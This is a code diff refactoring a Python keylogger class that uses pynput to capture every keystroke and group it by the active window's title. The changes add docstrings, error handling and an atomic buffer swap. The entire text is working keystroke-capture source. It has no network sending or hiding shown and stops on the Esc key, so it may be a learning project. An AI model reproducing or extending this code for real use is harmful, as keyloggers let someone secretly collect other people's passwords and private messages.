@@ -3,8 +3,16 @@ from pynput import keyboard
 import pygetwindow as gw
 
 
-def key_to_char(key):
-    """Utility method that converts a pynput key to a printable character."""
+def key_to_char(key) -> str:
+    """
+    Utility function to convert a pynput key event to a printable character.
+
+    Args:
+        key (keyboard.Key or keyboard.KeyCode): The pressed key.
+
+    Returns:
+        str: A printable character or a formatted representation for special keys.
+    """
     if isinstance(key, keyboard.KeyCode):
         return key.char  # Regular key (letters, numbers, symbols)
 
@@ -21,31 +29,54 @@ def key_to_char(key):
 
 
 class SimpleKeylogger(KeyloggerInterface):
-    """keylogger implementation using pynput keyboard."""
+    """
+    A simple keylogger implementation using the pynput library.
+
+    This keylogger records keystrokes and associates them with the currently active window.
+
+    Note: This class is NOT thread-safe because it uses atomic buffer swapping instead of locks. So if it will be
+    used in a multiple threads, thread safety mechanism should be implemented.
+
+    Attributes:
+        buffer (dict): Stores the logged keystrokes, categorized by active window.
+        running (bool): Indicates whether the keylogger is running.
+        listener (keyboard.Listener): The pynput keyboard listener.
+    """
 
     def __init__(self):
-        self.buffer = {}
+        """Initializes the keylogger."""
+        self.buffer = {}  # Stores keystrokes per active window
         self.running = False
         self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
 
     def on_press(self, key):
-        """Callback function for key press event."""
+        """
+        Callback function triggered when a key is pressed.
+
+        Args:
+            key (keyboard.Key or keyboard.KeyCode): The pressed key.
+        """
         try:
             key_pressed = key_to_char(key)
-        except AttributeError:
-            key_pressed = key.name
+        except Exception as e:
+            print(f"Error processing key: {e}")
+            return
 
         active_window = self.get_active_window()
 
         if active_window not in self.buffer:
-            self.buffer[active_window] = ''
+            self.buffer[active_window] = ""
         self.buffer[active_window] += key_pressed
 
     def on_release(self, key):
-        """Callback function for key release event."""
-        if key == keyboard.Key.esc:  # TODO: change to other keys maybe shortcut
-            self.running = False
-            return self.running
+        """
+        Callback function triggered when a key is released.
+
+        Args:
+            key (keyboard.Key): The released key.
+        """
+        if key == keyboard.Key.esc:  # TODO: change to other keys maybe a shortcut
+            self.stop()
 
     def start(self):
         """Starts listening for keystrokes."""
@@ -57,15 +88,30 @@ class SimpleKeylogger(KeyloggerInterface):
         self.running = False
         self.listener.stop()
 
-    def get_log(self):
-        """Returns the collected keystrokes."""
-        log_data = self.buffer.copy()
-        self.buffer.clear()
-        return log_data
+    def get_log(self) -> dict:
+        """
+        Retrieves the collected keystrokes and clears the buffer.
+
+        Uses atomic swapping to avoid race conditions.
+
+        Returns:
+            dict: The logged keystrokes categorized by active window.
+
+        Note: This method is NOT thread-safe if accessed from multiple threads.
+        """
+        old_buffer, self.buffer = self.buffer, {}
+        return old_buffer
 
     def get_active_window(self) -> str:
-        """Gets the title of the currently focused application."""
+        """
+        Gets the title of the currently focused application.
+
+        Returns:
+            str: The title of the active window or "Unknown" if unavailable.
+        """
         try:
-            return str(gw.getActiveWindow().title)
-        except AttributeError:
+            active_window = gw.getActiveWindow()
+            return str(active_window.title) if active_window else "Unknown"
+        except Exception as e:
+            print(f"Error getting active window: {e}")
             return "Unknown"
